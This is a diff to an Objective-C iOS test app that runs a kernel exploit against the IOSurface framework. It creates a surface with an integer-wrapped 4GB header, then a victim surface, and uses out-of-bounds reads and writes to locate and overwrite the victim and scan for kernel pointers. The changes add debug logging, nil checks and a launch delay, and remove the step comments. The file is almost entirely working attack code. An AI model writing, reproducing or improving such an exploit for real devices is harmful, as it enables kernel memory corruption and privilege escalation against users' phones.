@@ -20,13 +20,17 @@
     NSString *line = [NSString stringWithFormat:@"%@\n", msg];
     NSLog(@"%@", line);
     dispatch_async(dispatch_get_main_queue(), ^{
-        self.logView.text = [self.logView.text stringByAppendingString:line];
-        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
-        [self.logView scrollRangeToVisible:range];
+        if (self.logView) {
+            self.logView.text = [self.logView.text stringByAppendingString:line];
+            NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
+            [self.logView scrollRangeToVisible:range];
+        }
     });
 }
 
 - (void)scene:(UIScene *)scene willConnectToSession:(UISceneSession *)session options:(UISceneConnectionOptions *)connectionOptions {
+    NSLog(@"=== SCENE DELEGATE CALLED ===");
+    
     self.window = [[UIWindow alloc] initWithWindowScene:(UIWindowScene *)scene];
     self.window.backgroundColor = [UIColor blackColor];
     
@@ -47,14 +51,13 @@
     uname(&uts);
     [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
     
-    // Run exploit in background
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+    // Run exploit in background after short delay
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
         [self runExploit];
     });
 }
 
 - (void)runExploit {
-    // Step 1: Load IOSurface
     [self log:@"[1] Loading IOSurface..."];
     
     void *handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
@@ -75,7 +78,6 @@
     }
     [self log:@"PASS: IOSurface loaded"];
     
-    // Step 2: Open IOSurfaceRoot
     [self log:@"[2] Opening IOSurfaceRoot..."];
     io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
     if (!root) {
@@ -92,7 +94,6 @@
     }
     [self log:@"PASS: IOSurfaceRoot opened"];
     
-    // Step 3: Create F1 surface with 4GB header (integer wrap)
     [self log:@"[3] Creating F1 surface (4GB header wrap)..."];
     
     const char *f1_xml =
@@ -121,7 +122,6 @@
     }
     [self log:[NSString stringWithFormat:@"PASS: F1 surface ID = %u", f1_id]];
     
-    // Step 4: Create victim surface immediately after
     [self log:@"[4] Creating victim surface..."];
     
     const char *vic_xml =
@@ -145,7 +145,6 @@
     }
     [self log:[NSString stringWithFormat:@"PASS: Victim surface ID = %u", vic_id]];
     
-    // Step 5: Get F1 base address and test OOB
     [self log:@"[5] Testing F1 OOB access..."];
     
     void *f1_base = IOSurfaceGetBaseAddress(f1_id);
@@ -156,11 +155,9 @@
     }
     [self log:[NSString stringWithFormat:@"F1 base: %p", f1_base]];
     
-    // Lock F1 surface
     uint32_t seed = 0;
     IOSurfaceLock(f1_id, 1, &seed);
     
-    // Test: Read beyond 64KB boundary
     [self log:@"Reading beyond 64KB..."];
     uint64_t *ptr = (uint64_t *)f1_base;
     
@@ -171,31 +168,24 @@
         }
     }
     
-    // Test: Write beyond 64KB and check if victim is affected
     [self log:@"Testing cross-surface write..."];
     
     void *vic_base = IOSurfaceGetBaseAddress(vic_id);
     if (vic_base) {
         [self log:[NSString stringWithFormat:@"Victim base: %p", vic_base]];
         
-        // Write marker to victim
         *(uint32_t *)vic_base = 0x47474747;
         [self log:@"Wrote 0x47474747 to victim[0]"];
         
-        // Try to reach victim through F1 OOB
-        // Victim is allocated after F1, so it should be at higher address
-        // Try various offsets
         for (int offset = 0x10000; offset < 0x100000; offset += 0x1000) {
             uint32_t *test = (uint32_t *)((uint8_t *)f1_base + offset);
             if (*test == 0x47474747) {
                 [self log:[NSString stringWithFormat:@"*** FOUND VICTIM AT F1+0x%x ***", offset]];
                 
-                // Test write
                 *test = 0x43434343;
                 if (*(uint32_t *)vic_base == 0x43434343) {
                     [self log:@"*** CROSS-SURFACE OOB WRITE CONFIRMED ***"];
                     
-                    // Scan for kernel pointers
                     [self log:@"Scanning for kernel pointers..."];
                     for (int j = 0; j < 0x1000/8; j++) {
                         uint64_t val = ((uint64_t *)vic_base)[j];
@@ -225,10 +215,12 @@
 @implementation AppDelegate
 
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+    NSLog(@"=== APP DELEGATE CALLED ===");
     return YES;
 }
 
 - (UISceneConfiguration *)application:(UIApplication *)application configurationForConnectingSceneSession:(UISceneSession *)connectingSceneSession options:(UISceneConnectionOptions *)options {
+    NSLog(@"=== CONFIG FOR CONNECTING SCENE ===");
     UISceneConfiguration *config = [[UISceneConfiguration alloc] initWithName:@"Default Configuration" sessionRole:connectingSceneSession.role];
     config.delegateClass = [SceneDelegate class];
     return config;
@@ -240,6 +232,7 @@
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
+        NSLog(@"=== MAIN CALLED ===");
         return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
     }
 }
